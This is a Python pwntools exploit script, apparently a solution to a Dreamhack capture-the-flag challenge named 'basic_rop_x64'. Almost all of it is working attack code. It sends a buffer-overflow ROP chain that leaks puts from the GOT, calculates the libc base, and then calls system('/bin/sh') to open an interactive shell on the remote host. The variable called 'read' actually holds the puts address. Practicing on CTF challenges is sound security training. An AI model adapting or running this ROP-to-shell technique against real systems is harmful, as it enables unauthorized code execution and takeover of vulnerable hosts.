from pwn import *
def slog(name, addr): return success(": ".join([name, hex(addr)]))

p = remote("host3.dreamhack.games", 18759)
e = ELF("./basic_rop_x64")
libc = ELF("./libc.so.6")

read_plt = e.plt['read']
read_got = e.got['read']
puts_plt = e.plt['puts']
puts_got = e.got['puts']
pop_rdi = 0x0000000000400883
ret = 0x00000000004005a9
pop_rsi_r15 = 0x0000000000400881

payload = b"A" * 0x48
payload += p64(pop_rdi) + p64(puts_got)
payload += p64(puts_plt)
payload += p64(e.sym['main'])

p.send(payload)
p.recvuntil('A' * 0x40)
read = u64(p.recvn(6) + b"\x00" * 2)
libc_base = read - libc.symbols["puts"]
system  = libc_base + libc.symbols["system"]

slog("read", read)
slog("libc_base", libc_base)
slog("system", system)

binsh = libc_base + list(libc.search(b"/bin/sh"))[0]
payload = b"A" * 0x48 + p64(pop_rdi) + p64(binsh) + p64(system)
p.send(payload)

p.interactive()